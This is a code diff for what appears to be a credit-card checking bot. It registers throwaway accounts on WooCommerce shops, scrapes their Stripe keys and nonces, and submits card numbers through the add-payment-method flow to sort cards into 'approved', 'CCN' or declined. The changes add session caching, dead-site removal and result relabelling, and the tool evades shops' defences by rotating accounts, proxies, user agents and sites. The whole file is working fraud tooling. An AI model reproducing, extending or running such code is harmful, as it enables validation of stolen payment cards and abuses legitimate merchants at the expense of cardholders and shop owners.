@@ -2,7 +2,7 @@
 # 💤 Optional: Toggleable debug print silencer
 # ============================================================
 import builtins
-DEBUG_MODE = False  # set True if you want to see prints again
+DEBUG_MODE = True  # set True if you want to see prints again
 
 def _silent_print(*args, **kwargs):
     if DEBUG_MODE:
@@ -21,16 +21,55 @@ import random
 import string
 import threading
 import requests
+import glob
 from config import DEFAULT_API_URL
 from urllib.parse import urlparse
-from fake_useragent import UserAgent
 from requests.utils import dict_from_cookiejar, cookiejar_from_dict
 from requests.adapters import HTTPAdapter
 from requests.exceptions import ProxyError, ConnectTimeout, ConnectionError, ReadTimeout, SSLError
 from config import PAYMENT_LIMIT, RETRY_COUNT, RETRY_DELAY
 from runtime_config import get_all_default_sites, get_default_site
+from user_agents import get_random_user_agent
+from woo_helpers import (
+    build_registration_payload,
+    build_login_payload,
+    is_logged_in,
+)
 
 from proxy_manager import get_user_proxy
+
+
+# ==========================================================
+# SESSION CACHE (for fast session reuse)
+# ==========================================================
+_session_cache = {}  # {(chat_id, site_url, worker_id): session}
+_session_cache_lock = threading.Lock()
+
+
+def _get_session_cache_key(chat_id, site_url, worker_id=None):
+    """Generate cache key for session storage."""
+    return (str(chat_id), str(site_url), worker_id)
+
+
+def _get_cached_session(chat_id, site_url, worker_id=None):
+    """Get cached session if available and valid."""
+    key = _get_session_cache_key(chat_id, site_url, worker_id)
+    with _session_cache_lock:
+        return _session_cache.get(key)
+
+
+def _set_cached_session(chat_id, site_url, session, worker_id=None):
+    """Cache a session for reuse."""
+    key = _get_session_cache_key(chat_id, site_url, worker_id)
+    with _session_cache_lock:
+        _session_cache[key] = session
+
+
+def _clear_cached_session(chat_id, site_url, worker_id=None):
+    """Clear cached session (e.g., on rotation or failure)."""
+    key = _get_session_cache_key(chat_id, site_url, worker_id)
+    with _session_cache_lock:
+        _session_cache.pop(key, None)
 
 
 # ==========================================================
@@ -55,14 +94,44 @@ def get_next_user_site(chat_id):
         return get_default_site()
 
     with _site_lock:
-        # Reset rotation if user added/removed sites
-        if set(sites) != set(_site_rotation.get(chat_id, [])):
-            _site_rotation[chat_id] = []
-        if chat_id not in _site_rotation or not _site_rotation[chat_id]:
+        rotation_entry = _site_rotation.get(chat_id)
+
+        # Backwards compatibility with legacy list format
+        if isinstance(rotation_entry, list):
+            rotation_entry = {
+                "remaining": rotation_entry,
+                "snapshot": list(rotation_entry),
+            }
+
+        site_set = set(sites)
+        if (
+            not rotation_entry
+            or set(rotation_entry.get("snapshot", [])) != site_set
+        ):
             shuffled = sites[:]
             random.shuffle(shuffled)
-            _site_rotation[chat_id] = shuffled
-        return _site_rotation[chat_id].pop(0)
+            rotation_entry = {
+                "remaining": shuffled,
+                "snapshot": list(sites),
+            }
+
+        remaining = rotation_entry.get("remaining", [])
+        if not remaining:
+            remaining = sites[:]
+            random.shuffle(remaining)
+            rotation_entry["remaining"] = remaining
+            rotation_entry["snapshot"] = list(sites)
+
+        next_site = rotation_entry["remaining"].pop(0)
+
+        if not rotation_entry["remaining"]:
+            refreshed = sites[:]
+            random.shuffle(refreshed)
+            rotation_entry["remaining"] = refreshed
+            rotation_entry["snapshot"] = list(sites)
+
+        _site_rotation[chat_id] = rotation_entry
+        return next_site
 
 
 
@@ -78,6 +147,25 @@ def _get_user_site_file(chat_id):
 
 
 _save_lock = threading.Lock()
+
+
+def _normalize_site_key(site_url: str) -> str:
+    """
+    Normalize site URL to scheme://netloc without trailing slash.
+    Ensures consistent comparisons when adding/removing sites.
+    """
+    try:
+        site_url = (site_url or "").strip()
+        if not site_url:
+            return ""
+        if not site_url.startswith(("http://", "https://")):
+            site_url = f"https://{site_url}"
+        parsed = urlparse(site_url)
+        if parsed.scheme and parsed.netloc:
+            return f"{parsed.scheme}://{parsed.netloc}".rstrip("/")
+    except Exception:
+        pass
+    return site_url.rstrip("/")
 
 
 # ==========================================================
@@ -141,6 +229,77 @@ def _save_state(state, chat_id: str):
         with open(tmp, "w", encoding="utf-8") as f:
             json.dump(cleaned, f, indent=2)
         os.replace(tmp, path)
+# --- Step 1: helper to remove a user's dead site safely ---
+def remove_user_site(chat_id: str, site_url: str, worker_id: int | None = None) -> bool:
+    """
+    Remove a site from the user's JSON state if it exists.
+    Returns True if a site entry was removed, False otherwise.
+    Uses the same save lock as _save_state for thread safety.
+    """
+    try:
+        chat_id = str(chat_id)
+        target = _normalize_site_key(site_url)
+        if not target:
+            return False
+        state = _load_state(chat_id) or {}
+        user_entry = state.get(chat_id)
+        if not user_entry:
+            return False
+
+        sites = user_entry.get("sites", {})
+        removed = False
+        keys_to_remove = [
+            existing_key
+            for existing_key in list(sites.keys())
+            if _normalize_site_key(existing_key) == target
+        ]
+
+        if keys_to_remove:
+            for key in keys_to_remove:
+                del sites[key]
+            snapshot = user_entry.get("defaults_snapshot")
+            if isinstance(snapshot, list):
+                user_entry["defaults_snapshot"] = [
+                    snap for snap in snapshot if _normalize_site_key(snap) != target
+                ]
+            _save_state(state, chat_id)
+            removed = True
+            print(f"[REMOVE_SITE] Removed dead site for user {chat_id}: {target}")
+
+        # Also remove from worker-specific site files so the dead site cannot be reused.
+        user_dir = os.path.join("sites", chat_id)
+        if os.path.isdir(user_dir):
+            pattern = f"sites_{chat_id}_{worker_id}.json" if worker_id else f"sites_{chat_id}_*.json"
+            for path in glob.glob(os.path.join(user_dir, pattern)):
+                try:
+                    with open(path, "r", encoding="utf-8") as f:
+                        worker_state = json.load(f)
+                    worker_entry = worker_state.get(chat_id, {}).get("sites", {})
+                    worker_keys_to_remove = [
+                        existing_key
+                        for existing_key in list(worker_entry.keys())
+                        if _normalize_site_key(existing_key) == target
+                    ]
+                    if worker_keys_to_remove:
+                        for key in worker_keys_to_remove:
+                            del worker_state[chat_id]["sites"][key]
+                        snapshot = worker_state.get(chat_id, {}).get("defaults_snapshot")
+                        if isinstance(snapshot, list):
+                            worker_state[chat_id]["defaults_snapshot"] = [
+                                snap for snap in snapshot if _normalize_site_key(snap) != target
+                            ]
+                        with open(path, "w", encoding="utf-8") as f:
+                            json.dump(worker_state, f, indent=2)
+                        print(f"[REMOVE_SITE] Removed dead site from {os.path.basename(path)} for user {chat_id}")
+                        removed = True
+                except Exception as e:
+                    print(f"[REMOVE_SITE ERROR] Failed to update {path}: {e}")
+
+        return removed
+    except Exception as e:
+        print(f"[REMOVE_SITE ERROR] {e}")
+    return False
+        
 def replace_user_sites(chat_id, new_sites):
     """
     Replace a user's site list with new ones.
@@ -497,40 +656,36 @@ class SiteAuthManager:
         if session is None or not isinstance(session, requests.Session):
             session = self._new_session()
 
-        headers = {"User-Agent": UserAgent().random, "Referer": self.register_url}
+        headers = {"User-Agent": get_random_user_agent(), "Referer": self.register_url}
         try:
             page = safe_request(session, "get", self.register_url, headers=headers, timeout=10)
             if not hasattr(page, "text") or not page.text:
                 return None
 
-            if "<html" not in page.text.lower():
-                return None
+            login_html = page.text or ""
+            identifiers = []
+            if account.get("username"):
+                identifiers.append(account["username"])
+            if account.get("email") and account["email"] not in identifiers:
+                identifiers.append(account["email"])
 
-            nonce_match = re.search(r'name="woocommerce-login-nonce" value="([^"]+)"', page.text)
-            nonce = nonce_match.group(1) if nonce_match else None
+            for idx, identifier in enumerate(identifiers):
+                payload = build_login_payload(login_html, identifier, account["password"])
+                resp = safe_request(session, "post", self.register_url, headers=headers, data=payload, timeout=20)
+                if hasattr(resp, "text") and is_logged_in(resp.text):
+                    entry = self.state[self.chat_id]["sites"][self.site_url]
+                    entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
+                    entry["raw_cookies"] = session.cookies.get_dict(
+                        domain=self.site_url.replace("https://", "").replace("http://", "")
+                    )
+                    with open(self._user_site_file, "w", encoding="utf-8") as f:
+                        json.dump(self.state, f, indent=2)
+                    return session
 
-            data = {
-                "username": account["username"],
-                "password": account["password"],
-                "login": "Log in"
-            }
-            if nonce:
-                data["woocommerce-login-nonce"] = nonce
-
-            resp = safe_request(session, "post", self.register_url, headers=headers, data=data, timeout=20)
-            if not hasattr(resp, "text") or not resp.text:
-                return None
-
-            if "My account" in resp.text or "Logout" in resp.text:
-                entry = self.state[self.chat_id]["sites"][self.site_url]
-                entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
-                entry["raw_cookies"] = session.cookies.get_dict(
-                    domain=self.site_url.replace("https://", "").replace("http://", "")
-                )
-                with open(self._user_site_file, "w", encoding="utf-8") as f:
-                    json.dump(self.state, f, indent=2)
-
-                return session
+                # Refresh login page for next identifier
+                if idx + 1 < len(identifiers):
+                    page = safe_request(session, "get", self.register_url, headers=headers, timeout=10)
+                    login_html = page.text if page and hasattr(page, "text") else ""
 
             return None
 
@@ -544,41 +699,60 @@ class SiteAuthManager:
         if session is None or not isinstance(session, requests.Session):
             session = self._new_session()
 
-        headers = {"User-Agent": UserAgent().random, "Referer": self.register_url}
+        headers = {"User-Agent": get_random_user_agent(), "Referer": self.register_url}
         email = generate_random_email()
         username = generate_random_username()
         password = generate_random_string(12)
+        first_name = generate_random_string(6).title()
+        last_name = generate_random_string(6).title()
 
         try:
             page = safe_request(session, "get", self.register_url, headers=headers, timeout=10)
             if not page or not hasattr(page, "text"):
                 return None
 
-            nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', page.text)
-            nonce = nonce_match.group(1) if nonce_match else None
+            registration_html = page.text or ""
+            payload = build_registration_payload(
+                registration_html,
+                email=email,
+                username=username,
+                password=password,
+                first_name=first_name,
+                last_name=last_name,
+            )
 
-            data = {"username": username, "email": email, "password": password, "register": "Register"}
-            if nonce:
-                data["woocommerce-register-nonce"] = nonce
+            if not payload:
+                return None
 
-            resp = safe_request(session, "post", self.register_url, headers=headers, data=data, timeout=20)
+            resp = safe_request(session, "post", self.register_url, headers=headers, data=payload, timeout=20)
             if not resp or not hasattr(resp, "text"):
                 return None
 
-            if "My account" in resp.text or "Logout" in resp.text:
-                entry = self.state[self.chat_id]["sites"][self.site_url]
-                entry["accounts"] = [{"email": email, "username": username, "password": password}]
-                entry["payment_count"] = 0
-                entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
-                entry["raw_cookies"] = session.cookies.get_dict(
-                    domain=self.site_url.replace("https://", "").replace("http://", "")
-                )
-                with open(self._user_site_file, "w", encoding="utf-8") as f:
-                    json.dump(self.state, f, indent=2)
+            if not is_logged_in(resp.text):
+                verify = safe_request(session, "get", self.register_url, headers=headers, timeout=10)
+                if not verify or not is_logged_in(getattr(verify, "text", "")):
+                    return None
 
-                return session
+            entry = self.state[self.chat_id]["sites"][self.site_url]
+            entry["accounts"] = [{
+                "email": email,
+                "username": username,
+                "password": password
+            }]
+            entry["payment_count"] = 0
+            entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
+            entry["raw_cookies"] = session.cookies.get_dict(
+                domain=self.site_url.replace("https://", "").replace("http://", "")
+            )
+            with open(self._user_site_file, "w", encoding="utf-8") as f:
+                json.dump(self.state, f, indent=2)
 
-            return None
+            session._account_credentials = {
+                "email": email,
+                "username": username,
+                "password": password,
+            }
+            return session
 
         except Exception:
             return None
@@ -587,9 +761,10 @@ class SiteAuthManager:
     # ----------------------------------------------------------
     def _fetch_pk_and_nonce(self, session, headers):
         """
-        Fetch or reuse Stripe public key (pk_) and nonce from add-payment-method page.
-        - Reuses cached pk/account data from user's site JSON if present.
-        - Auto-logins or registers if the page is protected.
+        OPTIMIZED: Fetch or reuse Stripe public key (pk_) and nonce from add-payment-method page.
+        - Reuses cached PK permanently (site-specific, not account-specific)
+        - Only authenticates if session is invalid (trust until failure)
+        - Minimizes HTTP requests - only fetches nonce when needed
         """
         try:
             # 🧩 Load user's current site record
@@ -597,65 +772,116 @@ class SiteAuthManager:
             cached_pk = entry.get("stripe_pk")
             cached_nonce = entry.get("stripe_nonce")
 
-            # ✅ Reuse cached PK if available
+            # ✅ Reuse cached PK if available (PK is site-specific, cache permanently)
             if cached_pk and isinstance(cached_pk, str) and cached_pk.startswith("pk_"):
-                print(f"[DEBUG] Using cached Stripe PK from JSON → {cached_pk[:25]}...")
+                print(f"[DEBUG] Using cached Stripe PK → {cached_pk[:25]}...")
+                pk = cached_pk
             else:
-                cached_pk = None
+                pk = None
 
-            # ✅ Try to reuse last account if available
-            if entry.get("accounts"):
-                print("[DEBUG] Found saved account, will reuse for login.")
-                session = self._login_existing_account(session, entry["accounts"][-1])
-            else:
-                print("[DEBUG] No account found → creating new one.")
-                session = self._register_new_account(session)
+            # ✅ FAST: If we have PK and a valid cached session, try to use cached nonce first
+            # Nonces can be reused for a short time, so we'll try it and only fetch fresh if it fails
+            if pk and cached_nonce and session:
+                # Try using cached nonce - if it fails, we'll fetch fresh one
+                print(f"[DEBUG] Using cached nonce → {cached_nonce} (will fetch fresh if needed)")
+                return pk, cached_nonce
 
-            # Skip site fetch if PK cached and only Nonce missing
-            if cached_pk and not cached_nonce:
-                print("[DEBUG] Cached PK exists, fetching Nonce only.")
-
+            # ✅ FAST: Try to fetch payment page (session should already be authenticated)
+            # Trust the session - only re-authenticate if we get actual failure (401/403 or login page detected)
+            print("[DEBUG] Fetching payment page for nonce...")
             resp = safe_request(session, "get", self.payment_url, headers=headers, timeout=10)
+            
+            # Check for authentication failure
+            if resp and hasattr(resp, 'status_code') and resp.status_code in (401, 403):
+                print("[DEBUG] Got 401/403 → session expired, re-authenticating.")
+                # Session expired - need to re-authenticate
+                if entry.get("accounts"):
+                    session = self._login_existing_account(self._new_session(), entry["accounts"][-1])
+                else:
+                    session = self._register_new_account(self._new_session())
+                
+                if not session:
+                    print("[ERROR] Re-authentication failed.")
+                    return pk, cached_nonce
+                
+                # Update cached session
+                _set_cached_session(self.chat_id, self.site_url, session, self.worker_id)
+                
+                # Retry fetching payment page
+                resp = safe_request(session, "get", self.payment_url, headers=headers, timeout=10)
+                if not resp or resp.status_code not in (200, 302):
+                    print("[ERROR] Failed to fetch payment page after re-auth.")
+                    return pk, cached_nonce
+            
             if not resp or resp.status_code not in (200, 302):
                 print("[ERROR] No HTML response from site while fetching PK/Nonce.")
-                return cached_pk, cached_nonce
+                return pk, cached_nonce
 
             html_text = resp.text
 
-            # 🧩 Detect login page
-            if ("username" in html_text and "password" in html_text) or "Lost your password" in html_text:
-                print("[DEBUG] Detected login form → performing auto-login or registration.")
+            # 🧩 FAST: Only authenticate if we detect login page (trust session until failure)
+            # Check more carefully - look for positive indicators of being logged in first
+            is_logged_in_check = (
+                "customer-logout" in html_text 
+                or "My account" in html_text 
+                or "Logout" in html_text
+                or "woocommerce-MyAccount" in html_text
+                or "add-payment-method" in html_text.lower()  # Payment page itself indicates logged in
+            )
+            
+            # Only treat as login page if we're NOT logged in AND we see login form
+            # Be more strict - remove the small page check as it's too aggressive
+            is_login_page = (
+                not is_logged_in_check 
+                and (
+                    ("username" in html_text and "password" in html_text and ("login" in html_text.lower() or "sign in" in html_text.lower()))
+                    or "Lost your password" in html_text
+                )
+            )
+            
+            if is_login_page:
+                print("[DEBUG] Detected login form → session expired, re-authenticating.")
+                # Session expired - need to re-authenticate
                 if entry.get("accounts"):
-                    session = self._login_existing_account(session, entry["accounts"][-1])
+                    session = self._login_existing_account(self._new_session(), entry["accounts"][-1])
                 else:
-                    session = self._register_new_account(session)
+                    session = self._register_new_account(self._new_session())
+                
+                if not session:
+                    print("[ERROR] Re-authentication failed.")
+                    return pk, cached_nonce
+                
+                # Update cached session
+                _set_cached_session(self.chat_id, self.site_url, session, self.worker_id)
+                
+                # Retry fetching payment page
                 resp = safe_request(session, "get", self.payment_url, headers=headers, timeout=10)
                 if not resp or resp.status_code != 200:
-                    print("[ERROR] Login retry failed while fetching PK/Nonce.")
-                    return cached_pk, cached_nonce
+                    print("[ERROR] Failed to fetch payment page after re-auth.")
+                    return pk, cached_nonce
                 html_text = resp.text
 
             # ✅ Extract PK if not cached
-            pk = cached_pk
             if not pk:
                 pk_match = re.search(r'(pk_live|pk_test)_[0-9A-Za-z_\-]{8,}', html_text)
                 if pk_match:
                     pk = pk_match.group(0)
                     print(f"[DEBUG] Stripe PK fetched → {pk[:30]}...")
                 else:
-                    print("[WARN] Stripe PK still not found in HTML.")
+                    print("[WARN] Stripe PK not found in HTML.")
 
-            # ✅ Extract Nonce
+            # ✅ Extract Nonce (always fetch fresh nonce as it changes)
             nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', html_text)
             nonce = nonce_match.group(1) if nonce_match else cached_nonce
 
-            # ✅ Save any new PK/Nonce back to site JSON
-            entry["stripe_pk"] = pk
-            entry["stripe_nonce"] = nonce
+            # ✅ Save PK permanently (only if new), update nonce
+            if pk and pk != cached_pk:
+                entry["stripe_pk"] = pk
+            if nonce:
+                entry["stripe_nonce"] = nonce
             self.state[self.chat_id]["sites"][self.site_url] = entry
             with open(self._user_site_file, "w", encoding="utf-8") as f:
                 json.dump(self.state, f, indent=2)
-
 
             if not pk or not nonce:
                 print("[ERROR] Missing Stripe PK or Nonce → site issue.")
@@ -673,12 +899,11 @@ class SiteAuthManager:
 
 
     # ----------------------------------------------------------
-    # PROCESS CARD (main flow, full debug like gatet)
+    # PROCESS CARD (OPTIMIZED - fast session reuse)
     # ----------------------------------------------------------
     def process_card(self, ccx):
         from mass_check import is_stop_requested  # ensure callable
         entry = self.state[self.chat_id]["sites"][self.site_url]
-        session = self._new_session()
 
         print(f"\n[DEBUG] ===== Processing Card for {self.chat_id} on {self.site_url} =====")
 
@@ -687,73 +912,118 @@ class SiteAuthManager:
             print("[STOP] User stop requested before processing.")
             return {"status": "DECLINED", "reason": "User stopped process"}
 
-        # Try to reuse cookies
-        if entry.get("cookies"):
-            try:
-                base_domain = self.site_url.replace("https://", "").replace("http://", "")
-                if "raw_cookies" in entry:
+        # ✅ FAST: Try to reuse cached session first
+        session = _get_cached_session(self.chat_id, self.site_url, self.worker_id)
+        needs_auth = False
+        state_changed = False
+
+        # ✅ FAST: If we have an account AND a cached session, skip all authentication - go directly to Stripe
+        has_account = bool(entry.get("accounts"))
+        if has_account and session:
+            # Restore cookies to session if available
+            if entry.get("raw_cookies"):
+                try:
+                    base_domain = self.site_url.replace("https://", "").replace("http://", "")
                     for k, v in entry["raw_cookies"].items():
-                        session.cookies.set(k, v, domain=base_domain, path="/")
-                else:
-                    session.cookies = cookiejar_from_dict(entry["cookies"])
-
-                test = safe_request(session, "get", self.payment_url, timeout=8)
-                if test and ("Logout" in test.text or "My account" in test.text):
-                    entry["cookies_valid"] = True
-                    print("[DEBUG] Cookie valid — reused previous session.")
-                else:
-                    entry["cookies_valid"] = False
-                    entry["cookies"] = None
-                    print("[DEBUG] Cookie invalid — need new login/register.")
-            except Exception as e:
-                print(f"[DEBUG] Cookie check error: {e}")
-                entry["cookies_valid"] = False
-                entry["cookies"] = None
-
-        # Register new account if needed
-        if not entry.get("accounts"):
-            print("[DEBUG] No existing account, creating new one.")
-            session = self._register_new_account(session)
-            entry["payment_count"] = 1
-            with open(self._user_site_file, "w", encoding="utf-8") as f:
-                json.dump(self.state, f, indent=2)
-
-
-        # Rotate if limit reached
-        elif entry.get("payment_count", 0) >= PAYMENT_LIMIT:
-            print(f"[DEBUG] Payment limit reached ({PAYMENT_LIMIT}), rotating account.")
-            entry.clear()
-            entry.update({
-                "accounts": [],
-                "cookies": None,
-                "raw_cookies": None,
-                "cookies_valid": False,
-                "payment_count": 0,
-                "mode": "rotate",
-                "pk": None,
-                "pk_usage": 0
-            })
-            with open(self._user_site_file, "w", encoding="utf-8") as f:
-                json.dump(self.state, f, indent=2)
-
-            session = self._register_new_account(self._new_session())
-            entry["payment_count"] = 1
-            with open(self._user_site_file, "w", encoding="utf-8") as f:
-                json.dump(self.state, f, indent=2)
-
+                        if v:
+                            session.cookies.set(k, v, domain=base_domain, path="/")
+                except Exception as e:
+                    print(f"[DEBUG] Failed to restore cookies: {e}")
+            # Skip authentication - go directly to Stripe
+            print("[DEBUG] ✅ Account exists and session cached - going directly to Stripe API (no authentication).")
         else:
-            print("[DEBUG] Reusing existing account.")
-            last_acc = entry["accounts"][-1]
-            if not entry.get("cookies_valid", False):
-                session = self._login_existing_account(session, last_acc)
+            # Need to check authentication requirements
+            if not has_account:
+                # First time - need to register
+                print("[DEBUG] No existing account, will create new one.")
+                needs_auth = True
+            elif entry.get("payment_count", 0) >= PAYMENT_LIMIT:
+                # Payment limit reached - rotate account (register new)
+                print(f"[DEBUG] Payment limit reached ({PAYMENT_LIMIT}), rotating account (registering new).")
+                entry.clear()
+                entry.update({
+                    "accounts": [],
+                    "cookies": None,
+                    "raw_cookies": None,
+                    "cookies_valid": False,
+                    "payment_count": 0,
+                    "mode": "rotate",
+                    "pk": None,
+                    "pk_usage": 0
+                })
+                _clear_cached_session(self.chat_id, self.site_url, self.worker_id)
+                needs_auth = True
+                state_changed = True
+            elif session is None:
+                # Have account but no cached session - need to login
+                print("[DEBUG] Account exists but no cached session, will login.")
+                needs_auth = True
+            else:
+                # Have account and session but something is wrong - try to restore cookies
+                if entry.get("raw_cookies"):
+                    try:
+                        base_domain = self.site_url.replace("https://", "").replace("http://", "")
+                        for k, v in entry["raw_cookies"].items():
+                            if v:
+                                session.cookies.set(k, v, domain=base_domain, path="/")
+                        print("[DEBUG] ✅ Restored cookies to session - going directly to Stripe API.")
+                    except Exception as e:
+                        print(f"[DEBUG] Failed to restore cookies, will login: {e}")
+                        needs_auth = True
+                else:
+                    print("[DEBUG] No cookies saved, will login.")
+                    needs_auth = True
+
+        # Authenticate only when needed
+        if needs_auth:
+            if not entry.get("accounts"):
+                # Register new account (only happens on first card or after payment limit)
+                print("[DEBUG] Registering new account...")
+                session = self._register_new_account(self._new_session())
+                if session:
+                    entry["payment_count"] = 1
+                    # Ensure cookies are saved
+                    entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
+                    base_domain = self.site_url.replace("https://", "").replace("http://", "")
+                    entry["raw_cookies"] = session.cookies.get_dict(domain=base_domain)
+                    state_changed = True
+                    # Cache the session
+                    _set_cached_session(self.chat_id, self.site_url, session, self.worker_id)
+                    print("[DEBUG] Account registered and session cached.")
+            else:
+                # Login with existing account (only if session cache is empty)
+                print("[DEBUG] Logging in with existing account...")
+                last_acc = entry["accounts"][-1]
+                session = self._login_existing_account(self._new_session(), last_acc)
                 if not session:
+                    # Login failed, register new account
                     print("[DEBUG] Login failed, registering new account.")
                     session = self._register_new_account(self._new_session())
                     entry["payment_count"] = 1
+                    # Ensure cookies are saved
+                    entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
+                    base_domain = self.site_url.replace("https://", "").replace("http://", "")
+                    entry["raw_cookies"] = session.cookies.get_dict(domain=base_domain)
+                    state_changed = True
                 else:
                     entry["payment_count"] += 1
-            else:
-                entry["payment_count"] += 1
+                    # Ensure cookies are saved
+                    entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
+                    base_domain = self.site_url.replace("https://", "").replace("http://", "")
+                    entry["raw_cookies"] = session.cookies.get_dict(domain=base_domain)
+                    state_changed = True
+
+                # Cache the authenticated session
+                if session:
+                    _set_cached_session(self.chat_id, self.site_url, session, self.worker_id)
+                    print("[DEBUG] Session authenticated and cached.")
+        else:
+            # ✅ FAST PATH: Reuse existing session - just increment counter, no authentication
+            entry["payment_count"] = entry.get("payment_count", 0) + 1
+            state_changed = True
+
+        # Save state only if it changed
+        if state_changed:
             with open(self._user_site_file, "w", encoding="utf-8") as f:
                 json.dump(self.state, f, indent=2)
 
@@ -805,7 +1075,7 @@ class SiteAuthManager:
             }
 
         # Stripe: fetch PK + nonce
-        headers = {"User-Agent": UserAgent().random, "Referer": self.payment_url}
+        headers = {"User-Agent": get_random_user_agent(), "Referer": self.payment_url}
         pk, nonce = self._fetch_pk_and_nonce(session, headers)
         print(f"[DEBUG] Stripe PK: {pk}, Nonce: {nonce}")
 
@@ -901,11 +1171,21 @@ class SiteAuthManager:
 
         # 🧩 If Stripe failed, stop early (no site request)
         if not stripe_id:
+            # If Stripe fails due to API or connection issues → mark dead
+            is_network_issue = (
+                stripe_reason and any(x in stripe_reason.lower() for x in [
+                    "request failed", "connection", "timeout", "ssl", "proxy", "site"
+                ])
+            )
             return {
                 "status": "DECLINED",
                 "reason": f"Stripe: {stripe_reason or 'Unknown error'}",
-                "stripe": stripe_json
+                "stripe": stripe_json,
+                "site_dead": is_network_issue,
+                "site_url": self.site_url,
             }
+
+
 
         # ================================================================
         # Continue to site checkout
@@ -927,23 +1207,66 @@ class SiteAuthManager:
             timeout=10,
         )
 
+        # --- detect site not responding ---
         if not final_resp:
-            print("[ERROR] Site did not respond.")
-            return {"status": "DECLINED", "reason": "Site Response Failed"}
+            print("[ERROR] Site did not respond or timed out.")
+            # Only mark as dead if the issue looks like a true site failure
+            return {
+                "status": "DECLINED",
+                "reason": "Site Response Failed (Timeout or No Response)",
+                "site_dead": True,   # true dead site (no HTTP response at all)
+                "site_url": self.site_url,
+            }
+
+        # ✅ FAST: Detect authentication failure and clear session cache
+        if hasattr(final_resp, 'status_code') and final_resp.status_code in (401, 403):
+            print("[DEBUG] Authentication failed (401/403) → clearing session cache for next card.")
+            _clear_cached_session(self.chat_id, self.site_url, self.worker_id)
+
 
         try:
             site_json = final_resp.json()
             print(f"[DEBUG] Site response: {site_json}")
         except Exception as e:
             print(f"[ERROR] Site invalid JSON: {final_resp.text[:500]} ({e})")
-            site_json = {"success": False, "error": {"message": "Non-JSON response"}}
+            return {
+                "status": "DECLINED",
+                "reason": "Site invalid response",
+                "site_dead": True,
+                "site_url": self.site_url,
+            }
+
 
         # ✅ Process site result
         # ✅ Process site result
-        if site_json.get("success"):
+        site_requires_action = False
+        site_data = site_json.get("data")
+        if isinstance(site_data, dict):
+            status_value = str(site_data.get("status", "")).lower()
+            next_action_type = str(site_data.get("next_action", {}).get("type", "")).lower() if isinstance(site_data.get("next_action"), dict) else ""
+            site_requires_action = (
+                status_value in ("requires_action", "requires authentication", "authentication_required")
+                or "requires_action" in status_value
+                or "requires_action" in next_action_type
+                or "use_stripe_sdk" in next_action_type
+            )
+        elif isinstance(site_data, str):
+            site_requires_action = "requires_action" in site_data.lower() or "requires action" in site_data.lower()
+
+        if not site_requires_action:
+            # check top-level messages for requires_action even if data missing
+            site_json_str = json.dumps(site_json).lower()
+            if "requires_action" in site_json_str or "requires action" in site_json_str:
+                site_requires_action = True
+
+        if site_json.get("success") and not site_requires_action:
             print("[RESULT] ✅ Card added successfully (Site).")
             status = "CARD ADDED"
             reason = "Auth success🔥"
+        elif site_requires_action:
+            print("[RESULT] ⚠️ Site requires additional authentication (3DS).")
+            status = "3DS_REQUIRED"
+            reason = "Requires 3DS authentication."
         else:
             err_msg = (
                 site_json.get("data", {}).get("error", {}).get("message")
@@ -958,7 +1281,7 @@ class SiteAuthManager:
             elif any(x in err_msg for x in ["insufficient", "low balance", "not enough funds"]):
                 status, reason = "INSUFFICIENT_FUNDS", "Insufficient funds."
             elif any(x in err_msg for x in ["does not support", "unsupported", "not supported"]):
-                status, reason = "CVV", "Your card does not support this type of purchase."
+                status, reason = "APPROVED", "Your card does not support this type of purchase."
             elif any(x in err_msg for x in ["expired", "expiration", "invalid expiry"]):
                 status, reason = "DECLINED", "Card expired."
             elif any(x in err_msg for x in ["incorrect number", "your card is incorrect", "invalid number"]):
@@ -980,6 +1303,7 @@ class SiteAuthManager:
             "top_status": normalized["top_status"],
             "display_status": normalized["display_status"],
             "message": normalized["message"],
+            "reason": normalized["message"],
             "emoji": normalized["emoji"],
             "stripe": stripe_json,
             "site": site_json,
@@ -993,8 +1317,15 @@ class SiteAuthManager:
 
 
         if not final_resp:
-            print("[ERROR] Site did not respond.")
-            return {"status": "DECLINED", "reason": "Site Response Failed"}
+            print("[ERROR] Site did not respond or timed out.")
+            # mark this as a true dead site, because site didn't respond at all
+            return {
+                "status": "DECLINED",
+                "reason": "Site Response Failed (Timeout or No Response)",
+                "site_dead": True,
+                "site_url": self.site_url
+            }
+
 
         try:
             site_json = final_resp.json()
@@ -1027,7 +1358,7 @@ class SiteAuthManager:
             elif "insufficient" in err_msg:
                 status, reason = "INSUFFICIENT_FUNDS", "Insufficient funds"
             elif "does not support" in err_msg or "unsupported" in err_msg:
-                status, reason = "CVV", "Does not support purchase type"
+                status, reason = "APPROVED", "Does not support purchase type"
             elif "incorrect" in err_msg:
                 status, reason = "DECLINED", "Card number incorrect"
             elif "site_error" in err_msg or "no response" in err_msg:
@@ -1061,14 +1392,14 @@ def normalize_result(status_raw: str, err_msg: str = ""):
     status = (status_raw or "").upper().strip()
     err_lower = (err_msg or "").lower()
 
-    if any(x in err_lower for x in ["requires_action", "3ds", "authentication required"]):
+    if any(x in err_lower for x in ["requires_action", "requires action", "3ds", "authentication required"]):
         status = "3DS_REQUIRED"
     elif any(x in err_lower for x in ["insufficient", "low balance", "not enough funds"]):
         status = "INSUFFICIENT_FUNDS"
     elif any(x in err_lower for x in ["security", "cvc", "cvv", "invalid cvc", "incorrect cvc"]):
         status = "CCN"
     elif any(x in err_lower for x in ["does not support", "unsupported", "not supported"]):
-        status = "CVV"
+        status = "APPROVED"
     elif any(x in err_lower for x in ["incorrect number", "card number is incorrect", "your card is incorrect", "invalid number"]):
         status = "DECLINED"
         err_msg = "Your card number is incorrect"
@@ -1078,6 +1409,7 @@ def normalize_result(status_raw: str, err_msg: str = ""):
 
     mapping = {
         "CARD ADDED": ("Approved ✅", "CARD ADDED", "Auth success🔥", "✅"),
+        "APPROVED": ("Approved ✅", "APPROVED", err_msg or "Approved.", "✅"),
         "INSUFFICIENT_FUNDS": ("Insufficient Funds 💵", "INSUF_FUNDS", "Insufficient funds.", "💵"),
         "CCN": ("CCN 🔥", "CCN", "Your card security is incorrect.", "🔥"),
